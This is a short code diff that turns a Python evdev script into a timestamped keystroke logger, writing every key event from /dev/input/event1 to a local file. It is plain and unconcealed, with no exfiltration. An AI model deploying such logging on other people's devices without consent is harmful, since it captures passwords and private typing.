@@ -1,10 +1,14 @@
 #!/usr/bin/python3
 
 from evdev import InputDevice, categorize, ecodes
+import time
 dev = InputDevice('/dev/input/event1')
 
-print(dev)
+log_file = open('logfile','a')
 
 for event in dev.read_loop():
     if event.type == ecodes.EV_KEY:
-        print(categorize(event))
+        st = str(categorize(event))
+        local_time = time.asctime( time.localtime(time.time()))
+        log_file.write("{}:  {}\n".format(local_time, st))
+        log_file.flush()
